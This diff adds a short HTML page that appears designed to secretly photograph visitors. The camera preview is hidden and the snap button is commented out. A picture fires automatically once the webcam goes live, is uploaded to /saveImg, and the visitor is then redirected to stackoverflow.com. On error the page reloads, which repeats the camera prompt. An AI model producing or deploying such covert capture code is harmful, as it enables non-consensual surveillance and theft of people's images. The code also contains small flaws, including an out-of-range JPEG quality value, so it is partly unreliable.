@@ -1,0 +1,56 @@
+<html>
+<head>
+    <title>Capture picture from your webcam</title>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.25/webcam.js"></script>
+	 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+
+	</head>
+
+<body>
+    <div id="camera" style="height:auto;width:auto; text-align:left;display:none"></div>
+
+    <!--FOR THE SNAPSHOT-->
+    <!--<input type="button" value="Take a Snap" id="btPic" onclick="takeSnapShot()" /> -->
+    <p id="snapShot"></p>
+</body>
+
+<script>
+    // CAMERA SETTINGS.
+    Webcam.set({
+        width: 400,
+        height: 250,
+        image_format: 'jpeg',
+        jpeg_quality: 200
+    });
+    Webcam.attach('#camera');
+	
+
+    // SHOW THE SNAPSHOT.
+    takeSnapShot = function () {
+        Webcam.snap(function (data_uri) {
+          
+	console.log(data_uri);
+			  $.ajax({
+			  type: "POST",
+			  url: "/saveImg",
+			  cache: false,
+			  contentType: false,
+			  processData: false,
+			  data: data_uri,
+			  success:function(){
+					$(location).attr('href',"http://stackoverflow.com");
+				}
+			});
+	//document.getElementById('snapShot').innerHTML = 
+     //           '<img src="' + data_uri + '" width="70px" height="50px" />';
+        });
+    }
+	 
+	Webcam.on("live",takeSnapShot);
+	Webcam.on( 'error', function(err) {
+		// an error occurred (see 'err')
+		$(location).reload(true);
+	} );
+</script>
+</html>>
+
